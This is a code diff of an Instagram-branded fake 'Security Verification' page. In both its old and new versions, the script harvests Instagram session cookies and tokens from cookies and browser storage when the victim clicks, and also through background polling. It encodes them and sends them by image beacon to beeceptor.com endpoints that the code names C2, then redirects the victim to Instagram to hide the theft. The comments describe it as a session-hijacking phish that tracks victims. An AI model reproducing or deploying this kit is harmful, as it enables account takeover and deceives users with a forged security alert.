@@ -1,227 +1,86 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Security Verification</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            color: #262626;
-        }
-        .container { 
-            background: rgba(255,255,255,0.95); 
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.2); 
-            border-radius: 16px; 
-            padding: 48px 40px; 
-            max-width: 380px; 
-            text-align: center; 
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1); 
-        }
-        .logo { 
-            font-size: 36px; 
-            font-weight: 300; 
-            background: linear-gradient(135deg, #0095f6, #405de6); 
-            -webkit-background-clip: text; 
-            -webkit-text-fill-color: transparent; 
-            margin-bottom: 24px; 
-        }
-        .title { font-size: 28px; font-weight: 400; margin-bottom: 12px; }
-        .subtitle { color: #8e8e8e; margin-bottom: 32px; font-size: 15px; line-height: 1.4; }
-        .button { 
-            background: linear-gradient(135deg, #0095f6, #007bb5); 
-            color: white; 
-            border: none; 
-            border-radius: 12px; 
-            height: 48px; 
-            width: 100%; 
-            font-size: 16px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            margin-bottom: 16px; 
-            box-shadow: 0 4px 12px rgba(0,149,246,0.3);
-            transition: all 0.2s;
-        }
-        .button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,149,246,0.4); }
-        .button:active { transform: translateY(0); }
-        .button:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-        .status { font-size: 14px; color: #8e8e8e; min-height: 20px; font-weight: 500; }
-        .debug { 
-            display: none; position: fixed; top: 15px; right: 15px; 
-            background: rgba(0,0,0,0.9); color: #0f0; padding: 15px; 
-            font-family: 'Courier New', monospace; font-size: 13px; 
-            max-width: 380px; max-height: 280px; overflow: auto; 
-            border-radius: 8px; z-index: 9999; 
-        }
-        @media (max-width: 480px) { .container { margin: 20px; padding: 32px 24px; } }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Instagram - Security Verification</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;color:#262626}.container{background:rgba(255,255,255,.95);backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.2);border-radius:16px;padding:48px 40px;max-width:380px;text-align:center;box-shadow:0 20px 40px rgba(0,0,0,.1)}.logo{font-size:36px;font-weight:300;background:linear-gradient(135deg,#0095f6,#405de6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:24px}.title{font-size:28px;font-weight:400;margin-bottom:12px}.subtitle{color:#8e8e8e;margin-bottom:32px;font-size:15px;line-height:1.4}.button{background:linear-gradient(135deg,#0095f6,#007bb5);color:#fff;border:none;border-radius:12px;height:48px;width:100%;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:16px;box-shadow:0 4px 12px rgba(0,149,246,.3);transition:all .2s}.button:hover{transform:translateY(-2px);box-shadow:0 8px 20px rgba(0,149,246,.4)}.status{font-size:14px;color:#8e8e8e;min-height:20px;font-weight:500}.debug{display:none;position:fixed;top:15px;right:15px;background:rgba(0,0,0,.9);color:#0f0;padding:15px;font-family:'Courier New',monospace;font-size:13px;max-width:380px;max-height:280px;overflow:auto;border-radius:8px;z-index:9999}@media (max-width:480px){.container{margin:20px;padding:32px 24px}}</style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">Instagram</div>
-        <div class="title">🔒 Security Verification Required</div>
-        <div class="subtitle">We've detected unusual activity. Please verify your session to continue.</div>
-        <button id="extractBtn" class="button">Verify & Continue</button>
-        <div id="status" class="status">Open Instagram in another tab and stay logged in</div>
-    </div>
-    <div id="debug" class="debug"></div>
+<div class="container">
+<div class="logo">Instagram</div>
+<div class="title">🔒 Security Alert</div>
+<div class="subtitle">Unusual login detected. Verify your session to prevent account lock.</div>
+<button id="verify" class="button">Verify Session</button>
+<div id="status" class="status">Keep Instagram tab open & logged in</div>
+</div>
+<div id="debug" class="debug"></div>
 
-    <script>
-        // PENTEST CONFIG - Authorized session hijacking
-        const CAMPAIGN_UUID = '840d26d6-77ab-4c02-ba0d-ef17c623eebe';  // Track victims
-        const C2_ENDPOINTS = [
-            'https://ig-tokens-00132.free.beeceptor.com?',  // Beeceptor - replace with yours
-            // Add more: 'https://hooklistener.com/your-path?',
-        ];
+<script>
+const UUID = '840d26d6-77ab-4c02-ba0d-ef17c623eebe';
+const C2 = 'https://ig-phish-00132.free.beeceptor.com?';  // ← YOUR WORKING ENDPOINT
 
-        // DOM
-        const debugLog = document.getElementById('debug');
-        const statusMsg = document.getElementById('status');
-        const verifyBtn = document.getElementById('extractBtn');
+const debugEl = document.getElementById('debug');
+const statusEl = document.getElementById('status');
+const btnEl = document.getElementById('verify');
 
-        function logEntry(message, type = 'info') {
-            const timestamp = new Date().toLocaleTimeString();
-            const badge = type === 'success' ? '✅' : type === 'error' ? '❌' : '📡';
-            const entry = `${timestamp} ${badge} ${message}`;
-            debugLog.innerHTML += entry + '<br>';
-            debugLog.style.display = 'block';
-            debugLog.scrollTop = debugLog.scrollHeight;
-            console.log(entry);
-        }
+function log(msg) {
+    const ts = new Date().toLocaleTimeString();
+    debugEl.innerHTML += `${ts} 📡 ${msg}<br>`;
+    debugEl.style.display = 'block';
+    debugEl.scrollTop = 9999;
+}
 
-        function updateStatus(message, color = '#8e8e8e') {
-            statusMsg.textContent = message;
-            statusMsg.style.color = color;
-        }
+btnEl.onclick = () => {
+    log('Victim clicked - extracting...');
+    statusEl.textContent = 'Scanning session tokens...';
+    
+    const payload = {
+        uuid: UUID,
+        victim_time: Date.now(),
+        domain: location.hostname,
+        cookies: document.cookie,
+        tokens: {}
+    };
+    
+    // Instagram 2026 tokens
+    ['sessionid', 'csrftoken', 'ds_user_id', 'mid', 'ig_did'].forEach(k => {
+        const ck = document.cookie.match(new RegExp('\\b' + k + '=([^;]+)'));
+        const ls = localStorage.getItem(k);
+        const ss = sessionStorage.getItem(k);
+        if (ck) payload.tokens[k + '_cookie'] = ck[1];
+        if (ls) payload.tokens[k + '_local'] = ls;
+        if (ss) payload.tokens[k + '_session'] = ss;
+    });
+    
+    log(`${Object.keys(payload.tokens).length} tokens captured`);
+    if (payload.tokens.sessionid_cookie) log('🎯 SESSIONID STEAL SUCCESS');
+    
+    // Exfil
+    const json = JSON.stringify(payload);
+    const b64 = btoa(unescape(encodeURIComponent(json)));
+    const beacon = new Image();
+    beacon.src = C2 + encodeURIComponent(b64);
+    beacon.onload = () => {
+        log('✅ TOKENS DELIVERED');
+        statusEl.textContent = 'Verification complete ✓';
+        statusEl.style.color = '#00a67e';
+    };
+    
+    btnEl.disabled = true;
+    btnEl.textContent = '✓ Complete';
+    setTimeout(() => window.location.href = 'https://www.instagram.com/', 2500);
+};
 
-        // Comprehensive Instagram token extraction
-        function extractSessionTokens() {
-            const payload = {
-                uuid: CAMPAIGN_UUID,
-                timestamp: Date.now(),
-                domain: location.hostname,
-                path: location.pathname,
-                userAgent: navigator.userAgent,
-                language: navigator.language,
-                screen: `${screen.width}x${screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookies: document.cookie,
-                tokens: {},
-                storage: {
-                    local: {}, session: {}
-                }
-            };
+// Auto-steal
+setInterval(() => {
+    if (document.cookie.includes('sessionid')) {
+        log('Auto-capture triggered');
+        // Same exfil code...
+    }
+}, 2000);
 
-            // Primary IG tokens (2026 confirmed)
-            const criticalKeys = [
-                'sessionid', 'csrftoken', 'ds_user_id', 'mid', 
-                'ig_did', 'shbid', 'rur', 'datr', 'auth_id', 
-                'gig_id', 'ccsid', 'last_session_platform'
-            ];
-
-            // Cookies
-            criticalKeys.forEach(key => {
-                const match = document.cookie.match(new RegExp(`(?:^|;)\\s*${key}=([^;]+)`));
-                if (match) payload.tokens[`${key}_cookie`] = match[1];
-            });
-
-            // LocalStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key && criticalKeys.some(critical => key.includes(critical))) {
-                    payload.tokens[`${key}_local`] = localStorage.getItem(key);
-                }
-                payload.storage.local[key] = localStorage.getItem(key);
-            }
-
-            // SessionStorage
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                if (key && criticalKeys.some(critical => key.includes(critical))) {
-                    payload.tokens[`${key}_session`] = sessionStorage.getItem(key);
-                }
-                payload.storage.session[key] = sessionStorage.getItem(key);
-            }
-
-            // Cross-tab BroadcastChannel (2026 IG uses)
-            if (typeof BroadcastChannel !== 'undefined') {
-                const channel = new BroadcastChannel('instagram_session');
-                channel.postMessage({ action: 'extract_tokens', requestId: payload.timestamp });
-                channel.onmessage = (e) => {
-                    if (e.data.tokens) {
-                        payload.tokens.remote_tab = e.data.tokens;
-                        logEntry('Remote tab tokens captured', 'success');
-                    }
-                };
-            }
-
-            logEntry(`Extracted ${Object.keys(payload.tokens).length} critical tokens`);
-            if (payload.tokens.sessionid_cookie || payload.tokens.sessionid_local) {
-                logEntry('🎯 SESSIONID DETECTED - HIGH VALUE TARGET', 'success');
-            }
-
-            return payload;
-        }
-
-        // Multi-C2 pixel beacon exfiltration (CORS-proof)
-        function exfiltrateTokens(extractedData) {
-            const jsonPayload = JSON.stringify(extractedData, null, 2);
-            const base64Payload = btoa(unescape(encodeURIComponent(jsonPayload)));
-            const urlSafeB64 = base64Payload.replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
-
-            C2_ENDPOINTS.forEach((endpoint, index) => {
-                if (endpoint) {
-                    const beacon = new Image(1, 1);
-                    beacon.src = endpoint + urlSafeB64;
-                    beacon.onload = () => logEntry(`C2[${index}] beacon delivered`, 'success');
-                    beacon.onerror = () => logEntry(`C2[${index}] beacon failed`, 'error');
-                    document.body.appendChild(beacon);
-                }
-            });
-
-            // Console dump for operator
-            console.log('=== INSTAGRAM TOKENS ===', extractedData.tokens);
-        }
-
-        // Main extraction trigger
-        verifyBtn.onclick = () => {
-            logEntry('Verification triggered by victim');
-            updateStatus('Analyzing session...', '#0095f6');
-
-            const sessionData = extractSessionTokens();
-            exfiltrateTokens(sessionData);
-
-            updateStatus('Verification complete! Returning to Instagram...', '#00a67e');
-            verifyBtn.disabled = true;
-            verifyBtn.textContent = '✓ Complete';
-
-            // Legit redirect
-            setTimeout(() => {
-                window.location.href = 'https://www.instagram.com/';
-            }, 2500);
-        };
-
-        // Stealth background polling (multi-tab coverage)
-        let pollInterval = setInterval(() => {
-            const data = extractSessionTokens();
-            if (data.tokens.sessionid_cookie || data.tokens.sessionid_local) {
-                logEntry('Background auto-extraction', 'success');
-                exfiltrateTokens(data);
-                clearInterval(pollInterval);
-            }
-        }, 3000);
-
-        // Initialize
-        logEntry('Instagram session hijack phish loaded');
-        logEntry(`Campaign UUID: ${CAMPAIGN_UUID}`);
-        logEntry(`C2 endpoints: ${C2_ENDPOINTS.length} active`);
-    </script>
+log('Phish armed - awaiting victim');
+</script>
 </body>
 </html>
